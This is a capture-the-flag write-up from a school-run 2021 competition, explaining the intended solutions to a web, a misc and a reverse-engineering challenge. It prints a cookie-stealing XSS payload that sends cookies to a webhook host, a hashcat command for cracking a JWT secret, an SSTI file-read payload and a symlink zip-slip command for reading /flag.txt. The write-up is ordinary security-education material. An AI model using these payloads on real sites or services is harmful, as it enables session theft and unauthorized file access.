#HACK@AC 2021 Writeups by samuzora

HACK@AC is a CTF organized by the Anglo-Chinese School (Independent) Robotics Technology Society, held on 16 Oct 2021. I was part of the organizing team and made a grand total of 4 challenges (one got removed later on). It was generally quite a fun experience for all (excluding !help) and I learnt quite a bit from organizing this CTF, from dockerizing applications to debugging trivial typos. Below are writeups for some of the challenges, both made by me and by others.

[Web](#web)

[Misc](#misc)

[Unreleased](#unreleased)




## Web

### FatherBoat

Difficulty: Hard

Solves: 0 :<

Link: http://139.59.124.129:51000/

Description: You've heard of Mothership but have you heard of FatherBoat? Due to Mothership stealing all their visitors, the company couldn't make enough revenue to hire a good web dev. Before he left, he might have screwed over some stuff... Don't be too harsh on them please.

Author: Lucas

Intended Solution:
1. XSS
  Payload: `<script>fetch("https://webhook.site/unique-id/?c="+document.cookie)</script>`
  Explanation: The website tells us that one requires approval from the admin to post a story. Instead of getting approval from the admin, one can instead be the admin and thus bypass the approval process, especially since the admin seems to be sleeping/braindead. XSS is possible here as the story of the user is injected directly into the HTML DOM. The cookie is `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.OqbksdUdBezk8bCqbh7wJOBuHFIKGoKGkdbAiu9SiJk`
2. Hashcat
  Payload: `./hashcat.exe -a 3 -m 16500 ./.hash --increment ?l?l?l?l?l?l`
  Explanation: After obtaining the token from the admin and checking it out with jwt.io, it seems like even the admin isn't an admin, which sucks tbh. (blame it on the dev) So we have to crack the JWT secret. Luckily for us, the secret isn't very long, so it can be cracked easily using Hashcat (6 lowercase chars). The key is "father".
3. SSTI
  Payload: `{{get_file('flag.txt')}}`
  Explanation: After verifying ourselves as the admin, we can successfully submit stories. However, upon submitting a story, the website prompts us that "Server-side story sharing" has yet to be implemented. This is a direct hint towards Server Side Template Injection (SSTI), so one can test for possible SSTI with ``{{7*7}} or {{7*'7'}}``. Then at a loss of what exactly to do, one might attempt `{{config.items()}}` and stumble upon 2 important key-value pairs: `('BUILT_IN', 'get_file()'), ('FLAG', 'flag.txt')`. Afterwards it's easy, just `{{get_file('flag.txt')}}` to get the flag, `ACSI{gr4ndf4th3r_v3ssel}`.

Comments:

This challenge was made quite last minute, as we were kinda short of hard web challenges. The puppeteer was especially hard to set up. Originally I tried using the Python import of puppeteer, pyppeteer, but it turned out to be a nightmare. Afterwards I just set up an API for the JS puppeteer and the Python flask app to interact. According to inside info, HCI had already solved the XSS part, but they realized it was a multi-part challenge and just gave up :(. Hence 0 solves

## Misc

### !help

Difficulty: ~~Medium~~ **HARD**

Solves: 3 (all HCI btw)

Description: There's a bot in the CTF discord that seems unusually quiet. Maybe try DMing it? I hear he gives flags...

Author: Lucas

Intended Solution:

**Zip Slip**

The intended (obvious) solution was to exploit the fact that the bot only accepted .zip files in the !upload command. Admittedly, without sufficient experience this might have been hard to spot, but granted that the participants were allowed to google I thought that this wouldn't be too difficult. Anyway, the 2-liner command to generate the symlink and zip it is as follows: `ln -s /flag.txt link; zip -y payload.zip link`. Then !upload `payload.zip` and the bot will return the flag, `ACSI{symb0l1c_link5}`. For more info, click [here](https://snyk.io/research/zip-slip-vulnerability).

Comments:

I really underestimated the difficulty of this challenge. Originally, it was a much simpler and much easier directory traversal via the !image command which allows one to view any image/file in the bot's machine. However, *a certain person* said it was too easy and suggested a zip slip vulnerability instead. Sorry to all who attempted this challenge, I've heard your cries for *!help*, and will tone down the difficulty of similar challenges in the future. For the record, a total of 3 hints were given for this challenge, and a 4th would have been given had a certain flag hoarder from HCI not submitted his flag.

## Unreleased

### revnew (RE)

Difficulty: HARD

Solves: NA

Description: NA

Author: Elijah

Solution:

(According to Elijah, I can just ignore all the mallocs so here goes nothing.) Decompile the provided binary in IDA64. First important line is `scanf("%s", s);`, this just takes in the user input into `s`. Also we have `srand(0x10F2Cu);`, which sets the seed to 69420 in decimal. Next is `v67 = 8 * ((unsigned __int64)&v9[7] >> 3);`, which apparently makes `v67` a pointer to `s` (idk how). Afterwards we have a for loop, which loops through `s` and calls `(rand() % 21 + 69) * s[i]` into v25. Note that the output of rand() can be replicated as the seed is known. Then `s[i] = v25`. Then `  strcpy(v23, "01011100011001010111010001111001010110010010011101110100000100110100000111011001011110101000001001010110010011110010101011101101010000000010000101000011100000100111010001000011010110100011101000101000");` just means that v23 is set to `01011100011001010111010001111001010110010010011101110100000100110100000111011001011110101000001001010110010011110010101011101101010000000010000101000011100000100111010001000011010110100011101000101000` (important btw). Now we have another loop, which just loops through `s` and `dest += hex(s[i])`. Skipping through 25+ lines of arbitrary mallocs wait nvm we can't skim through cos the important statements are here and there... Brief summary: 

```v24 = unhex(dest)
v18 = binary(v24)
v6 = len(v18)

v6 = len(v24)
v12 = str(v18+2)[:(v6-7)]
v15 += v12
``` 
Lastly, we come to a very primitive XOR gate, where v23 is xored with v15 to get our output. Pseudocode (python-like) of what just happened: 
```s = input()
random.seed(69420)
v28 = 0
v69 = len(s)
v68 = v69 -1
v67 = 8 * (0 right shift 3)

for i in range(v69):
    v4 = rand()
    v25 = v4 % 21 + 69
    v25 = s[i] * v25
    v5 = v25
	s[i] = v5

v23 = "01011100011001010111010001111001010110010010011101110100000100110100000111011001011110101000001001010110010011110010101011101101010000000010000101000011100000100111010001000011010110100011101000101000"

dest = ''

for i in range(v69):
	src = hex(s[i])
    dest += src

v24 = unhex(dest)
v18 = binary(v24)
v6 = len(v18)

v6 = len(v24)
v12 = str(v18+2)[:(v6-7)]
v15 += v12

if v36 >= v35:
    v33 = v36
else:
    v33 = v35

for i in range(v33):
    if v23[i] == v15[i]:
		v9[i] = '0'
    else:
		v9[i] = '1'

print(v9)
```

The way to approach this problem is to work backwards with what we have. So assuming the start of the output we want is ACSI{, we can work backwards to find out that `dest = 1d26 2730 22...` in hex. Afterwards, an RNG script was written in C to replicate `v4 = rand()`. Then converting each byte in `dest` to decimal and dividing it by the respective `v4`s, we obtain `[r` in binary converted to ASCII. Wait did I mention that `strcpy(s, "[redacted]");` was important? `strcpy(s, "[redacted]");` is important. Now, realize that Elijah is a sadist who likes to watch people suffer with the key right under their nose and decompile horrendous C code with mallocs littered everywhere and the correct input is actually `[redacted]`, so go ahead and input that to obtain the flag, `ACSI{th3_he4p_1s_a_1ie}`. Overall this challenge was ~~A NIGHTMARE THAT I SPENT 2 WEEKS ON~~ pretty easy. I hope you understand why this challenge was unreleased.
